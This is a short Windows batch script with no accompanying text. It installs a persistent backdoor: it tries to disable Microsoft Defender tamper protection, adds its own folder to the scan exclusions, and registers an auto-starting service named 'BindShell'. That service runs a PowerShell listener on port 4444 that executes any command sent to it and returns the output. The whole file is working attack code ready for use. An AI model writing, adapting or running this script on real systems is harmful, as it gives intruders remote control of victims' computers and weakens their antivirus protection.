@echo off
sc delete BindShell 2>nul
powershell -ep bypass -c "Set-MpPreference -DisableTamperProtection `$true -ea 0; Add-MpPreference -ExclusionPath '%~dp0' -ea 0" >nul 2>&1
sc create BindShell binpath= "cmd /c @echo off ^& powershell -nop -ep bypass -c ^\"`$l=New-Object Net.Sockets.TcpListener('0.0.0.0',4444);`$l.Start();while(`$true){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){;`$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0,`$i);`$sb=(iex `$d 2^>^&1|Out-String);`$sb2=`$sb+'PS '+(pwd)+'> ';`$sb=[text.encoding]::ASCII.GetBytes(`$sb2);`$s.Write(`$sb,0,`$sb.Length);`$s.Flush()};`$c.Close()}\"" start= auto
sc start BindShell
